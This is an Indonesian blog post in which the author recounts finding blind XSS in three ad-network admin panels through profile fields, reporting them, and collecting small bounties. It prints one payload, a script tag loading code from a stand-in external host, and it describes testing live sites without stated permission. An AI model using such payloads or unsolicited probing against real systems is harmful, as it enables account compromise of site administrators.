---
layout: post
title: engintip Admin Panel situs Ad Networks
date: 2018-08-22 04:10:00 PM
permalink: project/2018-08-22-blind-xss-mengintip-admin-panel-situs-ad-networks/
author: xhellc0de
categories: pentesting
tags: vulnerability xss blind-xss bug-bounty
---
![Image of Ad Networks](https://noobsec.org/images/ad_network.png)

Karena kehidupan yang semakin sulit, banyaknya biaya hidup yang harus dipenuhi maka saya pun mencoba untuk mencari pendapatan tambahan dari Internet *(curhat)*. Salah satu yang saya lakukan adalah mencari uang dari situs periklanan atau biasa dikenal dengan Ad Networks. Ada banyak sekali situs Ad Networks di jagat internet ini, mulai dari yang paling terkenal milik Google yaitu Google Adsense, dan situs-situs Ad Networks lainnya.

Beberapa waktu lalu, saldo pada situ Ad Networks saya sudah mencapai batas yang dapat di-withdraw. Dan saya pun segera melakukan penarikan pada situs tersebut. Ketika mau melakukan withdraw, saya iseng mengganti nama pada profile dengan menambahkan payload XSS didalamnya. Berharap payload tersebut akan tereksekusi di panel admin dan saya bisa melihat-lihat dalemannya hehe.

Selang beberapa waktu, benar saja payload saya tereksekusi di admin panel Ad Networks tersebut. Saya berhasil melakukan **Blind XSS** pada situs tersebut.

![Image of Ad Networks Panel](https://noobsec.org/images/b1_panel.png)

**Blind XSS** merupakan salah satu jenis XSS yang cukup unik. Kita tidak bisa melihat kapan dan dimana payload akan tereksekusi, bahkan sering kali tidak tereksekusi. Maka dari itu disebut Blind, alias buta. Payload yang kita buat umumnya tereksekusi di aplikasi lain yang saling terhubung pada satu database.

Untuk kasus yang saya temukan ini, saya memasukan payload XSS pada Member Area Ad Networks, lalu saya melakukan **Wihtdrawal Request** yang dimana pastinya diperlukan pengecekan secara manual oleh Admin sebelum melakukan proses **Wihtdrawal** yang saya minta. Maka Admin membuka halaman yang berisi **Withdrawal Request** pada situsnya, dan pada halaman tersebut ada **Field Full Name** yang sebelumnya saya isi dengan Payload XSS pada Member Area saya.

Berikut ini contoh source code dari Field Full Name setelah saya isi payload XSS:

```
<td style="color:black;cursor:pointer;" userid="x" class="userid userid_x">John Smith"&gt;<script src="https://malicious.script/"></script></td>
```

Karena saya merupakan orang yang jujur dan baik hati. Maka saya segera melapor pada Admin situs tersebut terkait bug yang saya temukan. Tidak lupa pula menanyakan apakah ada reward yang saya dapatkan haha..

![Image of Ad Networks Email](https://noobsec.org/images/b1_email.png)

Tidak lama admin dari situs tersebut membalas email dan memberikan saya reward terkahit bug yang saya temukan. Lumayan, Withdraw nya jadi dobel hehe..

**Dari bug ini saya diberi reward sebesar $250. (Alhamdulillah)**

Tidak berhenti sampai disitu, saya pun mencoba hal yang sama pada situs Ad Networks yang lain. Karena situs mereka adalah situs penghasil uang, sudah pasti mereka punya uang dan mungkin mau memberi reward seperti pada situ yang awal tadi.

![Image of Kamen](https://noobsec.org/images/kamen.gif)

Pada situs berikutnya, payload XSS saya masukan pula pada field Full Name dan tereksekusi di Halaman **Channel List** pada panel admin. Halaman itu berisi daftar dari publisher yang ada pada situs tersebut. Walaupun pada awalnya mereka menyangkal dan tidak percaya bahwa ada bug di situs mereka, akhirnya mereka pun percaya setelah saya gunakan **alert** untuk memunculkan popup pada admin panel mereka XD

![Image of Ad Networks Panel](https://noobsec.org/images/b2_panel.png)

**Dari bug ini saya diberi reward sebesar $50. (Alhamdulillah)**

Yang terakhir saya menemukan bug yang sama pada situs Ad Networks asal Rusia. Kali ini payload tereksekusi di halaman Affiliates pada **Field User Skype**. Karena pada member Panel nya terdapat field Skype dan hanya field itu yang bisa diisi dengan payload XSS, field lainnya diproteksi sehingga tidak bisa memasukan HTML Tag.

![Image of Ad Networks Panel](https://noobsec.org/images/b3_panel.png)

Tidak seperti situs sebelumnya, admin situs ini sangat ramah dan sangat cepat tanggap. Bahkan ini merupakan **Bounty Hunting** tercepat yang saya alami. Proses dari mengirim report sampai diberi reward memakan waktu kurang dari 2 jam!

**15 Aug 2018 22:23 = Reported**
![Image of Ad Networks Email](https://noobsec.org/images/b3_email1.png)

**15 Aug 2018 23:06 = Rewarded**
![Image of Ad Networks Email](https://noobsec.org/images/b3_email2.png)

**Dari bug ini saya diberi reward sebesar $100. (Alhamdulillah)**

Begitulah cerita singkat saya *mengintip* admin panel ada situ Ad Networks. Semoga bisa memberi inspirasi bagi kalian semua para tukang ngintip wkwk. Mengintiplah untuk sesuatu yang baik, karena segala sesuatu yang baik akan membawa hasil yang baik pula.

Referensi:

https://www.acunetix.com/websitesecurity/detecting-blind-xss-vulnerabilities/
